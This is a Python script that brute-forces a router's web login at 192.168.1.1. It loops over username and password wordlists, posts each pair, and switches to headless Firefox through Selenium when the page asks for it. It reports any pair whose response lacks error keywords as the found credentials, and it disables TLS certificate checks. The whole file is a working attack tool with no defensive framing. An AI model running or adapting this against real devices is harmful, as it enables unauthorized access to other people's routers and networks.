import requests
import sys
from requests_html import HTMLSession
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

url = "http://192.168.1.1"  # Verifique o endereço em address.md para o endereço IP padrão dos roteadores.

expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade"}  # Alterado para bytes-like object.

def brute(username, password, combinations_tested, use_selenium=False):
    session = HTMLSession()
    try:
        r = session.post(url, data={'username': username, 'password': password}, verify=False)
    except requests.exceptions.SSLError as e:
        print("Erro de SSL:", e)
        sys.exit(1)
    combinations_tested += 1
    sys.stdout.write("\rCombinations tested: %d" % combinations_tested)
    sys.stdout.flush()

    if use_selenium or b"upgrade" in r.content:
        print("\nUpgrading to Selenium with Firefox headless...")
        try:
            options = Options()
            options.headless = True
            driver = webdriver.Firefox(options=options)
            print("Firefox WebDriver iniciado com sucesso")
            driver.get(url)
            print("Página carregada com sucesso")
            
            # Aguarda até 10 segundos até que os elementos estejam presentes
            username_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            password_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )
            print("Elementos do formulário encontrados")
            
            username_input.send_keys(username)
            password_input.send_keys(password)
            password_input.submit()
            print("Envio do formulário bem-sucedido")
            if not any(item in driver.page_source.encode('utf-8') for item in expression):
                print("\nBrute Forcing...")
                print("[+] Username: ", username)
                print("[+] Password: ", password)
                print("Server Response:", driver.page_source.encode('utf-8'))  # Imprimir conteúdo da resposta do servidor
                sys.exit()
            else:
                print("Condição de sucesso não satisfeita")
        except Exception as e:
            print("Erro ao usar o Selenium:", e)
            sys.exit(1)
        finally:
            driver.quit()
            return combinations_tested
    elif not any(item in r.content for item in expression):
        print("\nBrute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        print("Server Response:", r.content)  # Imprimir conteúdo da resposta do servidor
        sys.exit()
    else:
        print("Condição de upgrade não satisfeita")
        return combinations_tested

def main():
    combinations_tested = 0
    use_selenium = False
    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
    try:
        for username in usernames:
            for password in passwords:
                combinations_tested = brute(username, password, combinations_tested, use_selenium)
                if not use_selenium and b"upgrade" in requests.post(url, data={'username': username, 'password': password}, verify=False).content:
                    use_selenium = True
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")  # Imprime "Exiting..." em vermelho

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()